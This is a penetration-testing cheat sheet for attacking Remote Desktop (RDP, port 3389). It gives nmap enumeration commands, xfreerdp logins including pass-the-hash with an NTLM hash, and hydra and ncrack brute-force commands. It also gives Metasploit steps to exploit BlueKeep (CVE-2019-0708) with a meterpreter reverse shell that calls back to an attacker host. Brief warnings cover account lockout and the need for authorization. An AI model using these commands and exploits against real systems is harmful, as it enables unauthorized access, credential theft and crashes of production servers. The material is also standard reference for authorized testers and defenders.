# RDP (3389)

!!! warning "Watch out"
    RDP brute force generates Event ID 4625 entries rapidly. Avoid it unless you've confirmed there's no account lockout policy.

---

## Enumeration

```bash
nmap -p 3389 --script rdp-enum-encryption,rdp-ntlm-info $IP
```

---

## Connect

```bash
xfreerdp /u:"$USERNAME" /p:"$PASSWORD" /v:$IP /cert:ignore /dynamic-resolution +clipboard
xfreerdp /u:"$USERNAME" /p:"$PASSWORD" /v:$IP /drive:smbfolder,/local/path
```
!!! tip "Pass the Hash"
    For clients that support restricted-admin pass-the-hash, replace `/p:"$PASSWORD"` with `/pth:"$NTLM_HASH"`. The target must permit Restricted Admin mode.

---

## Brute Force

```bash
hydra -L users.txt -P passwords.txt rdp://$IP
ncrack -p 3389 -U users.txt -P passwords.txt $IP
```

Hydra's RDP module depends on the FreeRDP libraries included when Hydra was built. Confirm availability with `hydra -U rdp`; use Ncrack when the module is absent.

---

## BlueKeep (CVE-2019-0708)

[BlueKeep (CVE-2019-0708)](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2019-0708) is a pre-authentication RCE in Remote Desktop Services on specific legacy Windows releases, including Windows 7 and Server 2008/R2. There is no stock Nmap NSE check; use a non-exploit scanner first:

```bash
msfconsole
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
set RHOSTS $IP
run
```

If vulnerable, swap to the exploit module:

```bash
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS $IP
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST $LHOST
exploit
```

!!! warning "Watch out"
    The BlueKeep exploit module crashes the target more often than it lands a shell. Don't run it against production without explicit authorization, a BSOD on a terminal server takes every user session with it.
